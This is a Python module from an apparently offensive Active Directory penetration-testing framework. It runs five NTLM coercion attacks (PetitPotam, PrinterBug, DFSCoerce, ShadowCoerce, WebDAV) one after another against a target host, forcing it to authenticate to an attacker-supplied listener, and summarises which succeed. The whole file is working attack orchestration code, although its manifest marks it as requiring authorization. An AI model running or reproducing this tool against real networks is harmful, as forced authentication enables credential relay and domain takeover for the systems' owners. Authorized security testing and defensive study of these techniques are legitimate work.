"""Multi-protocol coercion scanner — tests all known coercion methods."""
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.coercion.coercer_multi.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ntlm_coercion", "rpc_call", "service_scan"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1187"],
}

COERCION_METHODS = [
    ("MS-EFSR (PetitPotam)", "adxpl.modules.coercion.petitpotam"),
    ("MS-RPRN (PrinterBug)", "adxpl.modules.coercion.printerbug"),
    ("MS-DFSNM (DFSCoerce)", "adxpl.modules.coercion.dfscoerce"),
    ("MS-FSRVP (ShadowCoerce)", "adxpl.modules.coercion.shadowcoerce"),
    ("WebClient (WebDAV)", "adxpl.modules.coercion.webclient_coerce"),
]


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target = args.target
    listener = getattr(args, "listener", None)
    scan_only = getattr(args, "scan_only", False)

    if not listener and not scan_only:
        print("[!] --listener required (or use --scan-only to check availability)", file=sys.stderr)
        return 1

    print("[*] Coercer multi-scan → {} (listener: {})".format(
        target, listener or "scan-only"))

    results = []
    for name, module_path in COERCION_METHODS:
        try:
            import importlib
            mod = importlib.import_module(module_path)
            if scan_only:
                print(f"  [*] {name} — module available")
                results.append((name, "available"))
            else:
                print(f"\n  [*] Trying {name}...")
                rc = mod.run(args)
                status = "success" if rc == 0 else "failed"
                results.append((name, status))
        except ImportError:
            results.append((name, "module_missing"))
        except Exception as exc:
            results.append((name, f"error: {exc}"))

    print("\n[*] Coercion scan summary:")
    for name, status in results:
        marker = "+" if status == "success" else "-"
        print(f"  [{marker}] {name} — {status}")

    successes = sum(1 for _, s in results if s == "success")
    return 0 if successes > 0 or scan_only else 1
